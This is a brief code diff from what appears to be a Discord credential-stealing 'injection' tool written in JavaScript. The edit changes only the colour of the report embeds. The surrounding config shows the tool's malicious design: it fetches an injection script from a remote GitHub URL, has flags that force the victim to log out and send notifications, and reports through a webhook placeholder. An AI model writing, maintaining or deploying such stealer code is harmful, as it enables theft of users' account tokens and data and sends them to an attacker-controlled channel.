@@ -15,7 +15,7 @@ var config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
-    "embed-color": 374276,
+    "embed-color": 5639644,
 
     injection_url: "https://raw.githubusercontent.com/xugga/hsgsfhsghsg/main/index.js",
     webhook: "%WEBHOOK%",
@@ -63,7 +63,7 @@ const makeEmbed = async ({
         content: "",
         embeds: [{
             title: title,
-            color: color,
+            color: config["embed-color"],
             fields: fields,
             description: description ?? "",
             
